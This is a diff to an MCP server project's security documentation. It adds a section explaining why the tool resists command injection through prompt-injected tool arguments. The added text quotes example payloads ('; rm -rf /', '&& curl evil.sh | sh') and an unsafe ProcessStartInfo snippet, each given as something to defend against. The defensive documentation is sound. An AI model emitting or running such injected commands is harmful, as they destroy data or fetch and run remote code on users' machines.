@@ -14,7 +14,7 @@
 |---|---|---|
 | **MCP tool annotations** (`ReadOnly` / `Destructive` / `Idempotent` / `OpenWorld`) | Every one of the 25 `[McpServerTool]` decorations declares its behavior class. Well-behaved clients (Claude Code, VS Code Copilot) use this to decide which tools auto-invoke vs need user confirmation — preventing prompt-driven exfiltration via tools the user didn't expect to fire. | `src/maf-autopilot/Tools/*.cs` — see annotation classification in [`CHANGELOG.md`](../CHANGELOG.md) under 1.0.0 breaking changes |
 | **Structured outputs** (JSON / SARIF) | `MafDoctor`, `MafScanAntiPatterns`, `MafValidateFanOut` etc. emit machine-readable schemas — no free-form prose that could embed prompt-injection payloads back into the LLM context | [`docs/output-schemas.md`](output-schemas.md) |
-| **No generic shell tool** | We do NOT expose `execute_command(string)`. Everything is a narrow, purpose-built tool (`MafRunCs0618Hunt` shells `dotnet build` and parses output; never executes arbitrary commands) | grep for `Process.Start` — only in `src/maf-autopilot/Tools/ProcessRunner.cs`, which only launches `dotnet`/`dotnet-inspect` |
+| **No generic shell tool, no string-concatenated commands** | We do NOT expose `execute_command(string)`. Everything is a narrow, purpose-built tool. The 3 sites that spawn a subprocess all use `ProcessStartInfo.ArgumentList` (argv-style, no shell) — see [Command injection via tool arguments](#command-injection-via-tool-arguments-keysight-2026) below for the structural breakdown | grep for `Process.Start` — only in `src/maf-autopilot/Tools/ProcessRunner.cs` (launches `dotnet` / `dotnet-inspect`) and `src/maf-autopilot/Tools/PullRequestAuditTool.cs` (launches `git`) |
 | **Path-validated repo input** | All tools that read user-repo files route through `PathGuard.ValidateRepoPath()` — rejects empty paths, nonexistent paths, malformed paths | `src/maf-autopilot/Tools/PathGuard.cs` |
 | **Default-on `--dry-run` for writers** | The 2 destructive tools (`MafAutoFix`, `MafAutoFixAll`) advertise `dryRun` as the safe path; agents see this in the tool's `[Description]` block | `src/maf-autopilot/Tools/AutoFixTool.cs` |
 | **5 MB cap on env-overridden registry** | `MAF_REGISTRY_PATH` env override caps file size to prevent OOM via a multi-GB poisoned registry | `src/maf-autopilot/Data/RegistryService.cs` (`RegistryMaxBytes`) |
@@ -27,6 +27,60 @@
 | **Multi-version regression CI** | Roslyn rewriters are run on pinned MAF 1.0 / 1.2 / 1.3 sample projects on every push — rewriter bugs that corrupt user code get caught before merge | `.github/workflows/*.yml` + `samples/maf-1.x-sample/` |
 | **`verify-registry` PR gate** | The AI-fill maintenance loop (release-watcher → Copilot Coding Agent → PR) is gated by a structural verifier — placeholders, broken examples, missing fields are caught before the PR can merge | `.github/workflows/maf-ai-fill-verify.yml` + `src/maf-autopilot/Commands/VerifyRegistryCommand.cs` |
 | **MIT-licensed, source-available** | All 25 tools, the analyzer, the rewriters, the registry — readable in the repo. No closed-source binaries shipped in the nupkg | `LICENSE` |
+
+---
+
+## Known MCP attack classes — coverage status
+
+This section names public, well-documented MCP attack classes and shows — with file/line citations — why MAF Doctor is not vulnerable. If a class isn't listed here, see [`docs/security/threat-model.md`](security/threat-model.md) for the full attack-surface map.
+
+### Command injection via tool arguments (Keysight, 2026)
+
+**Reference:** [Command Injection: Uncovering A New Attack Vector of MCP Server — Keysight Blogs, 12 Jan 2026](https://www.keysight.com/blogs/en/tech/nwvs/2026/01/12/mcp-command-injection-new-attack-vector)
+
+**The attack — in one sentence.** If an MCP server exposes a tool that shells out and *concatenates* tool arguments into a command string, the LLM can be prompt-injected into emitting arguments that break out of the intended command (`; rm -rf /`, `&& curl evil.sh | sh`, backtick subshells, etc.). Structurally identical to SQL injection: untrusted input → string concatenation → interpreter.
+
+**Are we vulnerable? No.** Four independent reasons, each verifiable from the repo:
+
+#### 1. No generic shell tool is exposed to the LLM
+
+None of the 25 `[McpServerTool]`s accept "a command to run." Every tool is a narrow capability the LLM *selects* — it does not parameterize a shell with model-generated text. There is no `execute_command(string)`, no `run_sql(string)`, no eval surface. The LLM picks *which* tool fires; it does not get to dictate *what command* runs.
+
+#### 2. All subprocess spawn sites use `ArgumentList`, never string concatenation
+
+With `ProcessStartInfo.ArgumentList`, .NET passes each element to the OS as a separate `argv[i]`. There is no shell to inject into — a payload like `; rm -rf /` would arrive at the child process as a single literal argv string and be rejected as a malformed argument. The unsafe `ProcessStartInfo.Arguments` *string* property (which Windows re-parses with shell-style splitting) is **not used anywhere** in the codebase.
+
+The exhaustive list of spawn sites:
+
+| File:line | Process | Argument construction |
+|---|---|---|
+| [`Tools/ProcessRunner.cs:24`](../src/maf-autopilot/Tools/ProcessRunner.cs) | `dotnet build` | `ArgumentList = { "build", projectOrSolutionPath, "--nologo" }` |
+| [`Tools/ProcessRunner.cs:39`](../src/maf-autopilot/Tools/ProcessRunner.cs) | `dotnet-inspect diff` | `ArgumentList = { "diff", "--package", $"{id}@{old}..{new}", "--source", … }` |
+| [`Tools/PullRequestAuditTool.cs:67`](../src/maf-autopilot/Tools/PullRequestAuditTool.cs) | `git diff` | `ArgumentList = { "-C", repoPath, "diff", "--name-only", $"{base}...HEAD" }` |
+
+All three set `UseShellExecute = false`. There is no `cmd.exe /c`, no `bash -c`, no PowerShell pipeline anywhere in the spawn path.
+
+#### 3. The invariant is checkable in one grep
+
+```bash
+grep -rn "Process.Start" src/
+```
+
+Returns only the three sites above (plus negative-test fixtures in `src/maf-autopilot.Tests/ScaffolderSecurityTests.cs` that prove the scaffolder rejects code-injection payloads in template inputs). If a future PR adds a fourth spawn site that uses the unsafe `Arguments` string property instead of `ArgumentList`, it shows up immediately in code review and is rejected per [`CONTRIBUTING.md`](../CONTRIBUTING.md) §"Adding an MCP server tool."
+
+#### 4. Cisco mcp-scanner enforces this from the outside
+
+The scanner's `code_execution` and `parameter_injection` YARA rules flag any tool whose `[Description]` or argument shape suggests shell execution. Latest run (2026-05-17, v4.6.0): **0 findings across 25 tools** — see [scan results](#latest-scan-results) below.
+
+#### What would break this guarantee
+
+So reviewers know what to reject: a contributor adding
+
+```csharp
+new ProcessStartInfo("dotnet") { Arguments = userInput }   // ← UNSAFE
+```
+
+— note the singular `Arguments` *string* property, which Windows re-parses with shell-style splitting. Always use `ArgumentList`. The [`ProcessRunner.cs`](../src/maf-autopilot/Tools/ProcessRunner.cs) summary block documents this as the first item in its hardening checklist.
 
 ---
 
